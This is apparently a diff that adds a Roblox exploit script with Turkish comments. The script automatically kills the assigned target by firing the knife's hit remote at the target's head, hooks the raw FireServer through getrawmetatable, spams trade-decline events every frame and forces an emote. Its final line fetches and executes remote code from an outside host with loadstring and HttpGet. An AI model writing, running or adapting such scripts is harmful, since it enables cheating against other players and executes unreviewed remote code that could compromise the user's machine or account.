@@ -1,0 +1,172 @@
+getgenv().otof = true -- false = tamamen durur
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local lp = Players.LocalPlayer
+
+local lastKill = 0
+local KILL_DELAY = 1 -- saniye
+
+-- Knife equip
+local function equipKnife()
+    local char = lp.Character or lp.CharacterAdded:Wait()
+    local backpack = lp:WaitForChild("Backpack")
+
+    local knife = char:FindFirstChild("Knife") or backpack:FindFirstChild("Knife")
+    if knife then
+        knife.Parent = char
+        local hum = char:FindFirstChildWhichIsA("Humanoid")
+        if hum then
+            hum:EquipTool(knife)
+        end
+        return knife
+    end
+end
+
+-- GUI hedef ismi
+local function getTargetName()
+    local gui = lp:FindFirstChild("PlayerGui")
+    if not gui then return end
+
+    local main = gui:FindFirstChild("MainGUI")
+    if not main then return end
+
+    local gameGui = main:FindFirstChild("Game")
+    if not gameGui then return end
+
+    local target = gameGui:FindFirstChild("Target3")
+    if not target then return end
+
+    local label = target:FindFirstChild("TargetName")
+    if label and label.Text ~= "" then
+        return label.Text
+    end
+end
+
+-- SnowToken kontrolü
+local function hasEnoughSnowTokens()
+    local gui = lp.PlayerGui
+    if not gui then return false end
+
+    local coins =
+        gui.MainGUI.Game.CoinBags.Container
+        .SnowToken.CurrencyFrame.Icon.Coins
+
+    local value = tonumber(coins.Text)
+    return value and value > 49
+end
+
+-- Hedef öldürme
+local function killTarget(plr)
+    if not plr or plr == lp then return end
+
+    local knife = equipKnife()
+    if not knife then return end
+
+    local remote =
+        knife:FindFirstChild("Events")
+        and knife.Events:FindFirstChild("HandleTouched")
+
+    if not remote then return end
+
+    local char = plr.Character
+    local head = char and char:FindFirstChild("Head")
+    if head then
+        remote:FireServer(head)
+        lastKill = os.clock()
+    end
+end
+
+-- 🔁 RunService döngüsü
+RunService.Heartbeat:Connect(function()
+    -- Toggle kapalıysa
+    if not getgenv().otof then return end
+
+    -- 3 saniye dolmadıysa
+    if os.clock() - lastKill < KILL_DELAY then return end
+
+    -- SnowToken yeterli değilse
+    if not hasEnoughSnowTokens() then return end
+
+    local targetName = getTargetName()
+    if not targetName then return end
+
+    local targetPlayer = Players:FindFirstChild(targetName)
+    if targetPlayer then
+        killTarget(targetPlayer)
+    end
+end)
+
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local Camera = Workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+
+-- WeaponDisplays temizle
+if Workspace:FindFirstChild("WeaponDisplays") then
+    Workspace.WeaponDisplays:Destroy()
+end
+
+
+
+-- UI konumunu değiştir
+local topbarElement = LocalPlayer.PlayerGui.GameTopbar.Container.MouseLock.Container
+topbarElement.Position = UDim2.new(0, getgenv().sas, 0, getgenv().aaa)
+topbarElement.Size = UDim2.new(0, getgenv().gen, 0, getgenv().yuk)
+
+-- SafeFire sistemi
+local rawFire = getrawmetatable(game).__index(Instance.new("RemoteEvent"), "FireServer")
+
+local function safeFire(remote, ...)
+    if typeof(remote) ~= "Instance" or not remote:IsA("RemoteEvent") then return end
+    return rawFire(remote, ...)
+end
+
+RunService.RenderStepped:Connect(function()
+    safeFire(ReplicatedStorage.Trade:FindFirstChild("DeclineTrade"))
+end)
+
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+local EMOTE_ID = 94292601332790
+
+local function applyEmote(char)
+    local humanoid = char:WaitForChild("Humanoid", 5)
+    local animate = char:WaitForChild("Animate", 5)
+    if not humanoid or not animate then return end
+
+    -- Animate açıkken emoji oynat
+    local ok = pcall(function()
+        humanoid:PlayEmoteAndGetAnimTrackById(EMOTE_ID)
+    end)
+
+    if ok then
+        -- Aynı tick içinde Animate kapatılır
+        task.defer(function()
+            animate.Disabled = true
+        end)
+    end
+
+    -- Animate tekrar açılmaya çalışırsa engelle
+    animate:GetPropertyChangedSignal("Disabled"):Connect(function()
+        if animate.Disabled == false then
+            animate.Disabled = true
+        end
+    end)
+end
+
+-- İlk spawn
+if lp.Character then
+    applyEmote(lp.Character)
+end
+
+-- Respawn (2 saniye bekleme ile)
+lp.CharacterAdded:Connect(function(char)
+    task.wait(2)
+    applyEmote(char)
+end)
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
